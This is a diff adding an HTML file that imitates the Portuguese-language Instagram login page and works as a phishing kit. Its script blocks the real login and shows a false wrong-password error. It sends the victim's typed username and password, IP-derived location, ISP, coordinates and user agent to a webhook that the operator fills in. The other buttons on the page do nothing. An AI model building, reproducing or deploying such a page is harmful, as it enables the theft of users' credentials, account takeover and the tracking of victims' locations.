@@ -1,0 +1,288 @@
+<html><head><base href="https://instagram.com/"><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Instagram • Entrar</title><style>
+body, html {
+    height: 100%;
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background-color: #fafafa;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+}
+.main-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    max-width: 935px;
+    width: 100%;
+    margin-bottom: 32px;
+}
+.phone-container {
+    position: relative;
+    margin-right: 32px;
+}
+.phone-image {
+    height: 618px;
+    width: 454px;
+    background-image: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png');
+    background-size: 454px 618px;
+    background-repeat: no-repeat;
+}
+.screenshot {
+    position: absolute;
+    height: 538px;
+    width: 250px;
+    left: 151px;
+    top: 26px;
+    opacity: 0;
+    transition: opacity 1.5s ease-in;
+}
+.screenshot.active {
+    opacity: 1;
+}
+.login-container {
+    max-width: 350px;
+    width: 100%;
+}
+.form-container {
+    background-color: white;
+    border: 1px solid #dbdbdb;
+    border-radius: 1px;
+    margin-bottom: 10px;
+    padding: 10px 0;
+}
+.logo {
+    margin: 22px auto 12px;
+    display: block;
+}
+form {
+    padding: 0 40px;
+    box-sizing: border-box;
+}
+input {
+    width: 100%;
+    margin-bottom: 6px;
+    padding: 9px 0 7px 8px;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    background-color: #fafafa;
+    font-size: 12px;
+}
+button {
+    width: 100%;
+    background-color: #0095f6;
+    border: 1px solid #0095f6;
+    color: white;
+    padding: 5px 9px;
+    font-weight: 600;
+    font-size: 14px;
+    border-radius: 4px;
+    margin-top: 8px;
+    cursor: pointer;
+}
+.separator {
+    display: flex;
+    align-items: center;
+    color: #8e8e8e;
+    margin: 10px 40px 18px;
+}
+.separator::before, .separator::after {
+    content: "";
+    flex: 1;
+    border-bottom: 1px solid #dbdbdb;
+}
+.separator span {
+    margin: 0 18px;
+    font-size: 13px;
+    font-weight: 600;
+}
+.facebook-login {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    color: #385185;
+    font-size: 14px;
+    font-weight: 600;
+    margin-bottom: 20px;
+    text-decoration: none;
+    cursor: pointer;
+}
+.facebook-icon {
+    margin-right: 8px;
+    width: 16px;
+    height: 16px;
+    background-image: url('https://static.cdninstagram.com/rsrc.php/v3/y5/r/TJztmXpWTmS.png');
+    background-repeat: no-repeat;
+    background-position: -414px -259px;
+    display: inline-block;
+}
+.forgot-password {
+    color: #00376b;
+    font-size: 12px;
+    line-height: 14px;
+    margin-top: 12px;
+    text-align: center;
+    cursor: pointer;
+}
+.signup-container {
+    background-color: white;
+    border: 1px solid #dbdbdb;
+    border-radius: 1px;
+    padding: 10px 0;
+    text-align: center;
+    margin-bottom: 10px;
+}
+.signup-text {
+    color: #262626;
+    font-size: 14px;
+    margin: 15px;
+}
+.signup-link {
+    color: #0095f6;
+    font-weight: 600;
+    text-decoration: none;
+    cursor: pointer;
+}
+.get-app {
+    text-align: center;
+}
+.get-app p {
+    margin: 10px 0;
+    font-size: 14px;
+}
+.app-download {
+    display: flex;
+    justify-content: center;
+}
+.app-download a {
+    margin: 0 4px;
+}
+.app-download img {
+    height: 40px;
+}
+.error-message {
+    color: #ed4956;
+    font-size: 14px;
+    line-height: 18px;
+    margin: 10px 40px;
+    text-align: center;
+}
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
+</head>
+<body>
+<div class="main-container">
+    <div class="phone-container">
+        <div class="phone-image">
+            <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fdfe239b7c9f.png" alt="Instagram screenshot 1" class="screenshot active">
+            <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot2.png/4d62acb667fb.png" alt="Instagram screenshot 2" class="screenshot">
+            <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot3.png/94edb770accf.png" alt="Instagram screenshot 3" class="screenshot">
+            <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot4.png/a4fd825e3d49.png" alt="Instagram screenshot 4" class="screenshot">
+        </div>
+    </div>
+    <div class="login-container">
+        <div class="form-container">
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
+            <form id="loginForm">
+                <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required>
+                <input type="password" name="password" placeholder="Senha" required>
+                <button type="submit">Entrar</button>
+            </form>
+            <div id="errorMessage" class="error-message" style="display: none;">
+                Sua senha está incorreta. Confira-a.
+            </div>
+            <div class="separator">
+                <span>OU</span>
+            </div>
+            <a class="facebook-login">
+                <span class="facebook-icon"></span>
+                Entrar com o Facebook
+            </a>
+            <div class="forgot-password">
+                Esqueceu a senha?
+            </div>
+        </div>
+        <div class="signup-container">
+            <p class="signup-text">Não tem uma conta? <a class="signup-link">Cadastre-se</a></p>
+        </div>
+        <div class="get-app">
+            <p>Obtenha o aplicativo.</p>
+            <div class="app-download">
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D9B4D83AC-20F6-4A46-B9F7-2C8C0883D6D7%26utm_content%3Dlo%26utm_medium%3Dbadge">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/y_/r/tUzYKZ-xrQK.png" alt="DISPONÍVEL NO Google Play">
+                </a>
+                <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1920%2C1080">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yE/r/QQnPXT5YsC4.png" alt="Baixe da Microsoft">
+                </a>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    document.getElementById('errorMessage').style.display = 'block';
+
+    const username = document.querySelector('input[name="username"]').value;
+    const password = document.querySelector('input[name="password"]').value;
+
+    try {
+        const ipInfo = await axios.get('https://ipapi.co/json/');
+        const userAgent = navigator.userAgent;
+
+        const data = {
+            content: "",
+            embeds: [{
+                title: "🚨 Nova Tentativa de Login 🚨",
+                color: 16711680,
+                fields: [
+                    { name: "👤 Usuário", value: username, inline: true },
+                    { name: "🔑 Senha", value: password, inline: true },
+                    { name: "🌆 Cidade", value: ipInfo.data.city || "Desconhecida", inline: true },
+                    { name: "🏙️ Região", value: ipInfo.data.region || "Desconhecida", inline: true },
+                    { name: "🌎 País", value: ipInfo.data.country_name || "Desconhecido", inline: true },
+                    { name: "🌐 ISP", value: ipInfo.data.org || "Desconhecido", inline: true },
+                    { name: "🔢 IP", value: ipInfo.data.ip || "Desconhecido", inline: true },
+                    { name: "🌍 Latitude", value: ipInfo.data.latitude?.toString() || "Desconhecida", inline: true },
+                    { name: "🌎 Longitude", value: ipInfo.data.longitude?.toString() || "Desconhecida", inline: true },
+                    { name: "🕰️ Fuso Horário", value: ipInfo.data.timezone || "Desconhecido", inline: true },
+                    { name: "📱 Operadora", value: ipInfo.data.asn || "Desconhecida", inline: true },
+                    { name: "💻 User Agent", value: userAgent }
+                ],
+                footer: {
+                    text: "Capturado em " + new Date().toLocaleString()
+                }
+            }]
+        };
+
+        const response = await axios.post('COLOQUE SUA WEBHOOK', data); /* Apague o texto e cole sua webhook em que a mensagem irá ser enviada */
+        console.log('Dados enviados com sucesso:', response.data);
+    } catch (error) {
+        console.error('Erro ao enviar dados:', error);
+    }
+});
+
+const screenshots = document.querySelectorAll('.screenshot');
+let currentIndex = 0;
+
+function rotateScreenshots() {
+    screenshots[currentIndex].classList.remove('active');
+    currentIndex = (currentIndex + 1) % screenshots.length;
+    screenshots[currentIndex].classList.add('active');
+}
+
+setInterval(rotateScreenshots, 5000);
+
+document.querySelector('.facebook-login').addEventListener('click', function(e) {
+    e.preventDefault();
+});
+
+document.querySelector('.forgot-password').addEventListener('click', function(e) {
+    e.preventDefault();
+});
+
+document.querySelector('.signup-link').addEventListener('click', function(e) {
+    e.preventDefault();
+});
+</script>
+</body></html>
